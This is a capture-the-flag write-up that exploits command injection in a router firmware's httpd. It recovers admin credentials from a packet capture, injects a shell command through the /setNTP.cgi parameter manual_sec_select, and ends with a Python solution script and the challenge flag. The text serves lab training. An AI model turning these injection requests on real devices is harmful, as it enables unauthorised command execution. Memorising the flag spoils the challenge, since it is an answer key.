# Solution Write Up for 'Reachable Fruit'
# Expected Behavior
## Provided Files
### `firmware.bin`
![firmware.bin](./assets/images/binwalk_firmware.png)

### `traffic.pcap`
![traffic.pcap](./assets/images/wireshark_traffic.png)

## Web Server
![management_console](./assets/images/management_console_login.png)

# Solution

1. Download [firmware.bin](./challenge/firmware.bin) and [traffic.pcap](./challenge/traffic.pcap).
2. Open `traffic.pcap` using Wireshark and notice that the majority of the packets are HTTP.
3. Follow one of the TCP streams which includes a POST request.

![Figure_1](./assets/images/tcp_stream_51.png)

**Figure 1**: Result of following TCP stream 51 in Wireshark.

4. Take note of the following information:
    - `POST /setWMM.cgi HTTP/1.1` indicates that the common gateway interface style of webpage interactivity is in use.
    - `Authorization: Basic YWRtaW46OF5oaiV1XjQwRDhiOCVseDQ3bjA=` request header, which gives the credentials `admin:8^hj%u^40D8b8%lx47n0%`.
    - `Content-Type: application/x-www-form-urlencoded`, which indicates that the request body uses percent encoding.
        - This is also evident in the request body `page=%2Fstation%2Fqos.asp&{...}`.
    - `Server: httpd` response header, which hints that the vuln is located in the `httpd` binary.
5. Extract the firmware with `binwalk -er1 firmware.bin`.
    5a. If `binwalk` throws an error due to the `-1`, just omit it. This is not needed with some versions of `binwalk`.
    5b. If you have not already done so, `sasquatch` is needed to unpack old squashfs filesystems. It can be installed with:
    ```
    git clone https://github.com/devttys0/sasquatch.git && \
    cd sasquatch && \
    sed -i 's/apt-get install/apt-get -y install/' build.sh && \
    CFLAGS=-fcommon ./build.sh && \
    which sasquatch
    ```
6. Take note of:
    - The location of the `httpd` binary (`_firmware.bin.extracted/squashfs-root/usr/sbin/httpd`)
    - The presence (and location) of the dummy `/www/flag` file.
        - NOTE: Simply GETting the `/flag` path from a browser with not yield the file's content.
7. Search for a vulnerability in `httpd` which will allow code execution using only static analysis. One way a vulnerability can be found:
    - Search for all uses of `system` where the argument string contains `%s`. This will produce 3 resutls:
        - `"date -s %s"`
        - `"date -s %s%s%s%s%s.%s"`
        - `"echo %s > /sys/class/net/br0/bridge/predefined_url"`
    - A little bit of working backwards shows that only easily injectable format string is `"date -s %s%s%s%s%s.%s"`; the values that are substitued for the `%s` tokens come from URL arguments via `get_cgi`.

<!-- 0040d25c          sprintf(&var_10c, "date -s %s", $s0_1)
0040d274          system(&var_10c)

0040e0b4              sprintf(&var_124, "date -s %s%s%s%s%s.%s", $s5_1, $s4_1, $s1_1, $s0_1, $s6_1, $v0_14, &_gp)
0040e0d0              printf("cmd_sys=%s \n", &var_124)
0040e0e8              system(&var_124)

0041fae8              sprintf(&var_124, "echo %s > /sys/class/net/br0/briâ€¦", $v0_25)
0041fb04              printf("cmd_sys=%s \n", &var_124)
0041fb1c              system(&var_124) -->

![Figure_2](./assets/images/do_setNTP.png)

**Figure 2**: Binanry Ninja's High Level IL view of the vulnerable funciton described in step 7. From the calls to `__assert`, it can be assumed that the function name is `do_setNTP`.

<!-- 8. Develop an exploit for this vulnerability. This can be as simple as a POST request. -->
8. Develop and exploit for this vulnerability. This can be as simple as a POST request.
    - The `/setNTP.cgi` endpoint deduced via `grep -i 'ntp' usr/sbin/httpd`.
    - The `Basic YWRtaW46OF5oaiV1XjQwRDhiOCVseDQ3bjA=` authorization header from the packet capture.
    - The `timeTag=manual` key-value pair from the logic of `do_setNTP`.
    - The `manual_sec_select` URL parameter (among options) from the calls to `get_cgi`.
    - The need for percent-encoding given the URL parameter context.
    - A semicolon must be prepended (and appended, depending which URL parameter is chosen) to the injected command to truncate the `date -s ` command.
```http
POST /setNTP.cgi HTTP/1.0
Host: localhost
Authorization: Basic YWRtaW46OF5oaiV1XjQwRDhiOCVseDQ3bjA=

timeTag=manual&manual_sec_select=<PERCENT_ENCODED_COMMAND_WITH_SEMICOLON_PREFIX>
```

9. Figure out a command which will make the contend of the flag file available via a GET request.
    
    0. As mentioned, `/www/flag` cannot be retrieved directly via a GET request.
    1. But other file types are clearly available. The extentions of files in `/www` can be shown with `find www -type f | cut -d '.' -f 2 | sort -u`.
    2. A whitelist of file extensions is present. `grep`ping for these file extensions shows a common result: `**.<EXTENTION>`
    3. The following command shows which file extensions are allowed: `strings usr/sbin/httpd | grep '\*\*\.'`.
    4. In order to make the flag content available, its file extention must change. Injecting the command `cp /www/flag /www/flag.css` will accomplish this.

<!-- ```bash
find www -type f | cut -d '.' -f 2 | sort -u
asp
css
gif
html
js
txt
strings usr/sbin/httpd | grep '\*\*\.'
**.asp*
**.htm
**.html
**.css
**.gif
**.jpg
**.png
**.ico
**.js*
``` -->

10. Percent-encode `;cp /www/flag /www/flag.css` to complete the expoit.
    - The result will be `%3Bcp%20/www/flag%20/www/flag.css`

11. Run the exploit.
```http
POST /setNTP.cgi HTTP/1.0
Host: localhost
Authorization: Basic YWRtaW46OF5oaiV1XjQwRDhiOCVseDQ3bjA=

timeTag=manual&manual_sec_select=%3Bcp%20/www/flag%20/www/flag.css
```

12. Get the flag!
```http
GET /flag.css HTTP/1.0
Host: localhost
Authorization: Basic YWRtaW46OF5oaiV1XjQwRDhiOCVseDQ3bjA=
```

## Supporting solution info
[//]: <> (Add your full solution scripts as files if applicable or use this section here to add a code block.)
```python
#!/usr/bin/env python3
'''
Solution script
'''
from urllib.parse import quote
from requests import get, post
from requests.auth import HTTPBasicAuth

VULNERABLE_ENDPOINT = 'http://localhost/setNTP.cgi'
HTTP_USER = 'admin'
HTTP_PASSWORD = '8^hj%u^40D8b8%lx47n0'
COPY_COMMAND = 'cp /www/flag /www/flag.css'
FLAG_URL = 'http://localhost/flag.css'

def copy_flag_to_www() -> None:
    '''
    Exploits command injection to make flag accessible.
    '''
    _ = post(
        VULNERABLE_ENDPOINT,
        data='timeTag=manual&manual_sec_select=' + quote(f';{COPY_COMMAND}'),
        auth=HTTPBasicAuth(HTTP_USER, HTTP_PASSWORD)
    )

def show_flag() -> None:
    '''
    Prints flag to standard out
    '''
    response = get(FLAG_URL, auth=HTTPBasicAuth(HTTP_USER, HTTP_PASSWORD))
    print(response.text)

if __name__ == '__main__':
    # NOTE: first connection can get refused for some reason.
    try:
        _ = get('http://localhost')
    except ConnectionError:
        pass

    copy_flag_to_www()
    show_flag()
```
### Usage: ```python3 ./solution.py```

### Expected output:

```ARC{7h3n_y0ur_3y35_5h411_b3_0p3n3d}```

[//]: <> (Give an explination of the code and how to run it here. Make sure to explain the correct output so that anyone following allong can verify that it is running correctly.)


# Flag
[//]: <> (Add the flag below)
**ARC{7h3n_y0ur_3y35_5h411_b3_0p3n3d}**
